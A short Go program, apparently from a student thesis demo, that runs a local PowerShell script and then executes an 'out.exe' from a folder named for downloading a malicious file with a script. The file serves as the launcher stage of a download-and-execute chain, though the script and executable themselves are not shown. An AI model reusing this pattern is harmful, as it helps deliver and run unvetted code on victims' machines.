package main

import (
	"fmt"
	"os/exec"
)

func main() {
	pws := exec.Command("powershell", "./script.ps1")

	if err := pws.Run(); err != nil {
		fmt.Println(err)
	}

	executable := exec.Command("C:/Users/acho/Desktop/diplomna/DownloadingMaliciousFileWithScript/out.exe")

	if err := executable.Run(); err != nil {
		fmt.Println(err)
	}

	fmt.Println("eho")
}
